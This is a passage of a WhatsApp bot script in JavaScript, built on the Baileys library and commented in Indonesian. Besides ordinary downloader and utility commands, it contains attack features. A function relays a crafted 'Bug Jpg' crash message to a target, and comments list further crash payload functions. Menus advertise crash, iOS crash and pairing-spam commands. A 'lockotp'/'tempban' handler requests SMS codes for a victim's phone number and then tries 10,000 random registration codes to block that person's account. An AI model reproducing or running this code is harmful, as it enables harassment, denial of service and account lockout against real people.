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",
            scansSidecar:
              "Sl6CM3K+yVZIMVPndmuHRGwdunpzPpsNeCSXWMY0a3s5d/Swhvc3rQ==",
            scanLengths: [9877, 27074, 16754, 31926],
            midQualityFileSha256:
              "vkK/C7Cj6CIkjZWGCg/pZ6x0pyBY0zSqPN7MymCYtOU=",
          },
        }),
        { userJid: target, quoted: QBug }
      );
      await client.relayMessage(target, etc.message, {
        participant: { jid: target },
        messageId: etc.key.id,
      });
      console.log(chalk.green("Sending Bug Jpg"));
    }

    /* Func By killuaXs
   yang di pake :
   - invisIos(target, true);
   - StukLoc(target, wanted, xbug, true)
   - CallCrash(target, xbug, true);
   - LockCrash(target, _0x140c8a)
   
   #Noted: Kalo mau nambah fitur pake func yg di atas aja (samain semua teks nya)
   
   Func sisa :
   - TxOs(target, true) 
   - CrashUi(target, null, xbug, cct = true, ptcp = true) 
   - sendExtendedTextMessage(target)
   - ZnX(target, "h4I 0m", 1045000, true)
   - StuckNull(target, xbug, true)
   */
		// End Func Bug
		
		const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: global.namabot, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.namabot }}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}
		
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await dhikaXs.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await dhikaXs.getName(i + '@s.whatsapp.net')}\n
FN:${await dhikaXs.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: ebpcrash@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/
item3.X-ABLabel:Github\n
item4.ADR:;;Japan;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await dhikaXs.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}


// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `killuaXs`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!dhikaXs.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"*⟅̊༑ ▾ ⌜ • ⌟ ▾ ༑̴⟆̊*",
"*★༑ ▾ ⌜ •• ⌟ ▾ ༑̴★*",
"*★༑ ▾ ⌜ •••• ⌟ ▾ ༑̴★*",
"*★༑ ▾ ⌜ ••••• ⌟ ▾ ༑̴★*",
"*★༑ ▾ ⌜ •••••• ⌟ ▾ ༑̴★*",
"*ボLoading 100% Completeボ*",
]
let { key } = await dhikaXs.sendMessage(from, {text: '*ボ*'})

for (let i = 0; i < baralod.length; i++) {
await dhikaXs.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)
const frpl = await reSize(xbug, 480, 640)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
dhikaXs.relayMessage(jid, order.message, { messageId: order.key.id})
}
const images = [
                  "https://pomf2.lain.la/f/o4wubdtc.jpg",
                  
   "https://pomf2.lain.la/f/o2qkd1rs.jpg",
                  
                  "https://pomf2.lain.la/f/bpr9voev.jpg",
                  
   "https://pomf2.lain.la/f/o4wubdtc.jpg",
                  
                  "https://pomf2.lain.la/f/o2qkd1rs.jpg",
                  
   "https://pomf2.lain.la/f/bpr9voev.jpg"
               ];
function getRandomImage() {
    const randomIndex = Math.floor(Math.random() * images.length);
	   return images[randomIndex];
		}
		  const thumburl = getRandomImage()
// Function Reply
const reply = (teks) => {
            dhikaXs.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `DhikaXCrashDev`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": xbug,
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const xrep = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `> powered by DhikaDev <`
}
}
}

// FUNCTION LOADING SEND BUG
async function loadingbug () {
  var faxzsendbug = [  
      `*⟅̊༑ ▾ ⌜ Menyiapkan ⌟ ▾ ༑̴⟆̊*\n*[ XXXXXXXXXXX•••••••• ]*`,
      `*⟅̊༑ ▾ ⌜ Menyiapkan ⌟ ▾ ༑̴⟆̊*\n*[ XXXXXXXXXXXXXX••• ]*`,
       `\`\`\`⚝ Memproses ⚝\`\`\``
     ]
   let { key } = await dhikaXs.sendMessage(m.chat, {text: '*⟅̊༑ ▾ ⌜ Menyiapkan ⌟ ▾ ༑̴⟆̊*\n*[ XXX••••••••••••••••••••••• ]*'})//Pengalih isu
   for (let i = 0; i < faxzsendbug.length; i++) {
   /*await delay(10)*/
  await dhikaXs.sendMessage(m.chat, {text: faxzsendbug[i], edit: key });//PESAN LEPAS
  }
}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
dhikaXs.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
dhikaXs.groupParticipantsUpdate(m.chat, [sender], 'delete')
dhikaXs.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {
//=================================================//
case 'start': {
await dhikaXs.sendMessage(m.chat, { react: { text: `⚡`, key: m.key }})
await loading();
//const fthm = await reSize(xbug, 640, 480)
const menu = `
「 *Information User Bot* 」

𝐎𝐰𝐧𝐞𝐫 : ${KILLUA} 
𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : K ↯ Agency ボ\`\𐁘 
𝐏𝐫𝐞𝐟𝐢𝐱 : 𝐌𝐔𝐋𝐓𝐈
𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : ${versisc}\n\n*

➼ 使 - *ACCESX*
 𖦹 /accessmenu

➼ 统 - *SYSTEM*
 𖦏 /systemmenu
 
➼ 使 - *ALLMENU*
 𖦹 /showall

๛ [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
 → ch dev : https://whatsapp.com/channel/0029VayrkbSAO7RNZKTCHK2U
 → 243976074413
 ⓘ please do not misuse
 `
    await killuaXs.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/n39c1x.jpg' },
        caption: menu,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 9999999,
            isForwarded: true
        }
    }, { quoted: fpay });
}
break;
 
case 'accessmenu': {
     await dhikaXs.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
     await loading();
     const menu = `
「 *Information User Bot* 」

<!>쵸 public
<!>쵸 self
<!>쵸 addacces 
<!>쵸 delacces

๛ [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
 → ch dev : https://whatsapp.com/channel/0029VayrkbSAO7RNZKTCHK2U
 → 243975074413
 ⓘ please do not misuse
`
    await dhikaXs.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/hxwld5.jpg' },
        caption: menu,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 9999999,
            isForwarded: true
        }
    }, { quoted: fpay });
}
break;

case 'systemmenu': {
await dhikaXs.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
await loading();
const menu = `
「 *Information User Bot* 」

<!>쵸 crash ↯ number!
<!>쵸 hai ↯ tempat
<!>쵸 x-ip ↯ khusus ios
<!>쵸 spampair number
<!>쵸 lockotp ↯ number

๛ [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
 → ch dev : https://whatsapp.com/channel/0029VayrkbSAO7RNZKTCHK2U
 → 243975074413
 ⓘ please do not misuse
    `;

    await dhikaXs.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/mlepep.jpg' },
        caption: menu,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 9999999,
            isForwarded: true
        }
    }, { quoted: fpay });
}
break;

case 'showall': {
 if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
    await dhikaXs.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
    await loading();
    const menu = `
 「 *Information User Bot* 」

➼ 使 - *HOSTING OTOMATIS*
- ʙᴜʏᴘᴀɴᴇʟ *(Oᴛᴏᴍᴀᴛɪs)*
- ʙᴜʏᴀᴅᴍɪɴᴘᴀɴᴇʟ *(Otomatis)*
- ʙᴜʏʀᴇsᴇʟʟᴇʀᴘᴀɴᴇʟ *(Oᴛᴏᴍᴀᴛɪs)*
- ʙᴀᴛᴀʟʙᴇʟɪ *(Mᴇᴍʙᴀᴛᴀʟᴋᴀɴ Pᴇᴍʙᴇʟɪᴀɴ)*
- ǫʀɪs *(Dᴇᴘᴏsɪᴛ Oʀᴋᴜᴛ Oᴛᴏᴍᴀᴛɪs)*

➼ 使 - *HOASTING OWNER*
- ᴜᴘᴅᴏᴍᴀɪɴ *(Lɪɴᴋ Dᴏᴍᴀɪɴʏᴀ)*
- ᴜᴘᴀᴘɪᴋᴇʏ *(Lɪɴᴋ Aᴘɪᴋᴇʏɴʏᴀ)*
- ᴜᴘᴄᴀᴘɪᴋᴇʏ *(ʟɪɴᴋ Cᴀᴘɪᴋᴇʏɴʏᴀ)*
- ʟɪɴᴋsᴇʀᴠᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴀᴛᴀ Sᴇʀᴠᴇʀ)*
- ᴄᴘᴀɴᴇʟ *(Mᴇʟɪʜᴀᴛ Lɪsᴛ Rᴀᴍ)*
- ᴄᴀᴅᴍɪɴ *(Usᴇʀ-Nᴏᴍᴏʀ)*
- ʟɪsᴛᴀᴅᴍɪɴ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Aᴅᴍɪɴ)*
- ʟɪsᴛsᴇʀᴠᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Sᴇʀᴠᴇʀ)*
- ʟɪsᴛᴜsᴇʀ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Aʟʟ Usᴇʀ)*
- ᴅᴇʟᴀᴅᴍɪɴ *(Mᴇɴɢʜᴀᴘᴜs Aᴅᴍɪɴ)*
- ᴅᴇʟsᴇʀᴠᴇʀ *(Mᴇɴɢʜᴀᴘᴜs Sᴇʀᴠᴇʀ)*
- ᴅᴇʟᴜsᴇʀ *(Mᴇɴɢʜᴀᴘᴜs Usᴇʀ)*
- ᴄʟᴇᴀʀᴀᴅᴍɪɴ *(Iᴅ Aᴅᴍɪɴ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀsᴇʀᴠᴇʀ *(Iᴅ Sᴇʀᴠᴇʀ Yᴀɴɢ Dɪ Kᴇᴄᴜᴀʟɪᴋᴀɴ)*
- ᴄʟᴇᴀʀᴜsᴇʀ *(Mᴇɴɢʜᴀᴘᴜs Aʟʟ Usᴇʀ Kᴇᴄᴜᴀʟɪ Aᴅᴍɪɴ)*    

➼ 使 - *DOWNLOAD*
- sᴘᴏᴛɪғʏ *(URL ᴍᴜsɪᴄ)*
- ᴛɪᴋᴛᴏᴋ *(URL Tɪᴋᴛᴏᴋ)*
- ᴘʟᴀʏ *(Jᴜᴅᴜʟ ʟᴀɢᴜ)*
- ᴍᴇᴅɪᴀғɪʀᴇ *(Iɴᴘᴜᴛ ʟɪɴᴋ)*

➼ 使 - *TOOLS*
- ʙᴀᴄᴋᴜᴘ *(Bᴀᴄᴋᴜᴘ Sᴄʀɪᴘᴛ)*
- ᴄʟᴇᴀʀ *(Sᴇssɪᴏɴ)*
- ɢᴇᴛᴄᴀsᴇ *(Lɪʜᴀᴛ ғɪᴛᴜʀ)*
- ʀᴇɴᴀᴍᴇᴄᴀsᴇ *(Uʙᴀʜ ɴᴀᴍᴀ ғɪᴛᴜʀ)*
- ᴀᴅᴅᴄᴀsᴇ *(Tᴀᴍʙᴀʜ ғɪᴛᴜʀ)*
- ᴅᴇʟᴄᴀsᴇ *(Hᴀᴘᴜs ғɪᴛᴜʀ)*
- ɢᴇᴛғᴜɴᴄ *(Lɪʜᴀᴛ ғᴜɴɢsɪ)*
- ᴇᴅɪᴛᴄᴀsᴇ *(Eᴅɪᴛ sᴛʀᴜᴋᴛᴜʀ)*
- sᴇᴛᴘᴘʙᴏᴛ *(Uʙᴀʜ Fᴏᴛᴏ ᴘʀᴏғɪʟ ʙᴏᴛ)*
- ғɪᴛᴜʀɴᴇᴡ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Fɪᴛᴜʀ Nᴇᴡ)*
- ᴀᴅᴅғɪᴛᴜʀ *(Mᴇɴᴀᴍʙᴀʜᴋᴀɴ Fɪᴛᴜʀ Kᴇ Lɪsᴛ)*
- ᴄʟᴇᴀʀғɪᴛᴜʀ *(Mᴇɴɢʜᴀᴘᴜs Sᴇᴍᴜᴀ Fɪᴛᴜʀ)*
- ᴅᴏɴᴇ *(Iɴᴘᴜᴛ Dᴀᴛᴀ Bᴀʀᴀɴɢ)*
- ᴘᴀʏᴍᴇɴᴛ *(Mᴇɴᴀᴍᴘɪʟᴋᴀɴ Pᴀʏ Oᴡɴᴇʀ)*
- ᴛᴏᴜʀʟ *(Rᴇᴘʟʏ ɪᴍᴀɢᴇ)*
- ɢᴇᴛ *(Iɴᴘᴜᴛ URL)*
- ᴇɴᴄʀʏᴘᴛ *(Iɴᴘᴜᴛ ᴄᴏᴅᴇ)*
- ᴇɴᴄʀʏᴘᴛᴠ2 *(Iɴᴘᴜᴛ ᴄᴏᴅᴇ)*
- ᴅᴇᴄʀʏᴘᴛ *(Iɴᴘᴜᴛ ᴄᴏᴅᴇ)*
- sᴛɪᴄᴋᴇʀ *(Rᴇᴘʟʏ Iᴍᴀɢᴇ/Vɪᴅᴇᴏ)*
- sʜᴏʀᴛʟɪɴᴋ *(Iɴᴘᴜᴛ Uʀʟ)*
- ɢɪᴘʜʏ *(Iɴᴘᴜᴛ Gɪғ Rᴀsɪᴏ)*
- ᴄᴜᴀᴄᴀ *(Iɴᴘᴜᴛ Kᴏᴛᴀ)*
- ᴄᴇᴋɪᴘ *(Iɴᴘᴜᴛ Iᴘ)*
- ᴛʀᴀɴsʟᴀᴛᴇ *(Iɴᴘᴜᴛ Bᴀʜᴀsᴀ)*
- ᴄʜᴀᴛʙᴏᴛ *(Iɴᴘᴜᴛ Tᴇᴋs)*

๛ [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
 → ch dev : https://whatsapp.com/channel/0029VayrkbSAO7RNZKTCHK2U
 → 243975074413
 ⓘ please do not misuse
    `;

    await dhikaXs.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/pzb3f2.jpg' },
        caption: menu,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 9999999,
            isForwarded: true
        }
    }, { quoted: fpay });
}
break;

case "lockotp":
 case "tempban": {
          if (!isOwner) return reply(mess.only.premium)
          if (!q) return reply(`Example: ${prefix + command} country_code|number\n\nExample: ${prefix + command} 62|8xxx`)
          //let numbers = JSON.parse(fs.readFileSync('./database/dtbs/tempban.json'))
          let cCode = q.split("|")[0]
          let number = q.split("|")[1]
          let fullNo = cCode + number
          reply(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time.\nRegistration interruption will be stopped if success 10000x registration.`)
          try {
              let {
    				makeWaSocket,
    				saveCreds,
    				fetchLatestBaileysVersion
       			  } = useMultiFileAuthState('./tempban') //('@whiskeysockets/baileys')
			  
let res = await dhikaXs.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
method: "sms"
});
} catch (err) {}

for (let i = 0; i < 10000; i++) {
					try {
						var dhikaXsPrefix = Math.floor(Math.random() * 999);
						var dhikaXsSuffix = Math.floor(Math.random() * 999);
						await dhikaXs.register(`${dhikaXsPrefix}-${dhikaXsSuffix}`);
					} catch (err) {
						console.log(`Register code :\n${dhikaXsPrefix}-${dhikaXsSuffix}\n`);
					}
				}
			}
			break

//----------FRIST--------//

case 'sc':
case 'script':
m.reply(`Halo! aku menggunakan script dari Dhika`)
break

case 'play': {
    if (!isOwner) return reply(mess.only.premium)
if (!text) return m.reply(`*Example:* ${prefix + command} phdotograph`)
let search = await yts(text);
let telaso = search.all[0].url;
var responsek = await ytdl(telaso)
var puki = responsek.data.mp3
dhikaXs.sendMessage(m.chat, { audio: { url: puki },
mimetype: "audio/mpeg",
fileName: "kiuu.mp3",
contextInfo: {
forwardingScore: 100,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: search.all[0].title,
sourceUrl: search.all[0].timestamp,
thumbnailUrl: search.all[0].thumbnail,
}}},{quoted:m})
}
break
case 'backup':{
if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await dhikaXs.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break        

case 'tourl': {
    if (!isOwner) return reply(mess.only.premium)
if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
let q = m.quoted ? m.quoted : m
dhikaXs.sendMessage(from, {
react: {
text: '🎁',
key: m.key
}
});
let media = await q.download()
let uploadImage = require('./serverside/libary/catmoe')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
m.reply(`Your Link : ${link}\nExpired Date : Liftime`)
}
break
case 'spotify':
   if (!isOwner) return reply(mess.only.premium)    
  if (!text) return m.reply(`Urlnya mana?\n*Contoh:* ${prefix + command} https://open.spotify.com/track/xxxxxx`)
  dhikaXs.sendMessage(m.chat, { react: { text: '👒', key: m.key }})
  let urlSpo = linkRegex.test(text)
  if (!urlSpo) return m.reply(`Hanya Support Url Track *(music)*\n*Contoh Url:* https://open.spotify.com/track/xxxxxx`)
  let response = await spotifyDown(text)
  let { nama, title, durasi, thumb, url } = response
  
  if (response) {
  let cap = `*© 𝖲𝗉𝗈𝗍𝗂𝖿𝗒 𝖬𝗎𝗌𝗂𝖼*

*[🏷️] Info Music*
* *Title:* ${title}
* *Durasi:* ${durasi}
* *Artis:* ${nama}
* *Spotify:* ${text}

\`Kamu Dapat Mencari Music Spotify\`\n*Caranya:* ${prefix}spotisearch <music name>`
  await dhikaXs.sendMessage(m.chat, { text: cap, contextInfo: { mentionedJid: [m.sender], externalAdReply: { mediaUrl: '', mediaType: 1, title: title, body: '© AanzzzCuyxzz', thumbnailUrl: thumb, sourceUrl: '', renderLargerThumbnail: true, showAdAttribution: false } } }, { quoted: m });
 dhikaXs.sendMessage(m.chat, { audio: { url: url }, mimetype: 'audio/mp4' }, { quoted: m })
  } else {
     m.m.reply(eror)
    }
  break
        
case 'tiktok': {
    if (!isOwner) return reply(mess.only.premium)
async function tiktok(query) {
 return new Promise(async (resolve, reject) => {
 try {
 const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

 const response = await axios({
 method: 'POST',
 url: 'https://tikwm.com/api/',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Cookie': 'current_language=en',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 },
 data: encodedParams
 });
 const videos = response.data.data;
 const result = {
 title: videos.title,
 cover: videos.cover,
 origin_cover: videos.origin_cover,
 no_watermark: videos.play,
 watermark: videos.wmplay,
 music: videos.music
 };
 resolve(result);
 } catch (error) {
 reject(error);
 }
 });
}
if (args.length == 0) return m.reply(`☘️ *Link Tiktoknya Mana?*`)
if (!isUrl(args[0])) return m.reply('⚠️ *Itu Bukan Link Yang Benar*')
m.reply(mess.wait)
let cap = ``
let res = await tiktok(`${args[0]}`)
dhikaXs.sendMessage(m.chat, { video: { url: res.no_watermark }, caption: cap, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
dhikaXs.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break
case 'clear': {
if (!isOwner) return reply(` \`𝗡𝗼 ↯ 𝗔𝗰𝗰𝗲𝘀\` `)
                fs.readdir("./sessionserver", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return m.reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return m.reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    m.reply(teks)
                    await sleep(2000)
                    m.reply("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./sessionserver/${file}`)
                    });
                    await sleep(2000)
                    m.reply("Successfully deleted all the trash in the session folder")
                });
            }
            break

     
case 'self': {
if (!isOwner) return reply(mess.only.premium)
dhikaXs.public = false
m.reply(`Succes switch mode bot sekarang mode self`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.premium)
dhikaXs.public = true
m.reply(`Succes switch mode bot sekarang mode public`)
}
break

case 'decrypt':
    if (!isOwner) return reply(mess.only.premium);
    if (!text) return m.reply('Mana textnya');
    const memek = await deobfuscate(text);
    const water = `/*\n * Deobfuscated By Dhika Official market | secure 〽️\n * Buy Script Pv me\n*/\n\n`;
    const lastt = water + memek; 
    await dhikaXs.sendMessage(m.chat, { 
        document: Buffer.from(lastt, 'utf-8'), 
        fileName: 'deobfuscated_code.js', 
        mimetype: 'application/javascript' 
    }, { quoted: m, caption: 'Sukses Deobfuscation' });

    break;
case 'encrypt':
    if (!isOwner) return reply(mess.only.premium)
    if (!text) return m.reply('Mana textnya');

    // Proses deobfuscation
    const kkkk = await EncryptJs(text);

    // Pastikan hasilDeobfuscate adalah string dan hapus tanda kutip di awal dan akhir
    const cleanResult = kkkk.replace(/^"|"$/g, ''); // Menghapus tanda kutip di awal dan akhir

    // Tambahkan watermark di awal hasil
    const watermark = `/*\n * Obfuscated By AanzzzCuyxzz\n * Buy Script Pv me\n\n*/\n\n`;
    const finalResult = watermark + cleanResult; // Gabungkan watermark dengan hasil asli

    // Mengirim hasil sebagai file JavaScript
    await dhikaXs.sendMessage(m.chat, { 
        document: Buffer.from(finalResult, 'utf-8'), 
